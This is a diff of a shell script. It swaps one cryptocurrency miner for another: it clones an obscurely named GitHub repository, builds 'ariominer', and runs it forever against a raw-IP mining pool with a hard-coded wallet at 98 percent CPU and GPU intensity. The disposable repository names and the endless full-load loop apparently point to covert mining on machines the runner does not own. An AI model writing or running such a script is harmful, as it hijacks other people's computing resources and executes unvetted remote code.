@@ -1,14 +1,13 @@
-apt-get install -y libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git
-
-git clone https://github.com/mobileapps84741274/xmr8474
-cd ./xmr8474/
+git clone https://github.com/mobileapps84741274/blueinc84747474
+cd ./blueinc84747474/
+mkdir build
 cd build
-cmake .. -DOpenCL_ENABLE=OFF
+cmake ..
 make
 
 while true
 do
 
-./xmr-stak-nvidia
+./ariominer --mode miner --pool http://135.181.63.177 --wallet 3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3 --name linux8474 --cpu-intensity 98 --gpu-intensity-cblocks 98 --gpu-intensity-gblocks 98
 
 done
